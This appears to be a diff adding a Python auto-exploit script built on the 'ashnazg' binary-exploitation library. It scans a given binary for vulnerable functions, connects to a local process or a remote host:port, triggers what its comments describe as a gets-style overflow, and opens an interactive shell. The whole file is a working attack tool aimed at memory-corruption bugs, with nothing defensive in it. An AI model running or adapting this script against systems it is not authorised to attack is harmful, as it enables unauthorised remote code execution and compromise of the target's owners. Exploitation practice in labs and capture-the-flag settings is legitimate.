@@ -1,0 +1,58 @@
+#!/usr/bin/env python3
+import argparse
+
+import ashnazg
+import logging
+
+def exploit(options):
+    nazg = ashnazg.Ashnazg(options.binary, libc=options.libc)
+
+    # find a vulnerable function
+    vulns = list(nazg.find_vulnerable_functions())
+    if not vulns:
+        print("No vulnerable functions found!")
+        return
+    vuln = vulns[0]
+
+    # begin exploit
+    remote = None
+    if options.remote:
+        host, port = options.remote.split(":")
+        port = int(port)
+        remote = (host,port)
+    conn = nazg.connect(remote=remote)
+
+    if options.suffix:
+        vuln.suffix = options.suffix.replace("\\n","\n")
+
+    # get the program to the vulnerable function
+    # input.
+    conn.navigate(vuln.entry())
+
+    # 'GETS' vulnerability can be applied immediately if
+    # Binary is neither PIE nor canary. This is
+    # automatically detected, but we explicitly assume
+    # it here.
+    conn.exploit(vuln)
+
+    # clear up any output prior to shell
+    conn.interactive()
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--binary", required=True)
+    parser.add_argument("--libc")
+    parser.add_argument("--suffix")
+    parser.add_argument("--remote")
+    parser.add_argument("--verbose", action="store_true")
+    options = parser.parse_args()
+
+    angr_logger = logging.getLogger('angr')
+    angr_logger.setLevel(logging.CRITICAL)
+
+    if options.verbose:
+        logging.getLogger("ashnazg").setLevel("DEBUG")
+    exploit(options)
+
+if __name__=="__main__":
+    main()
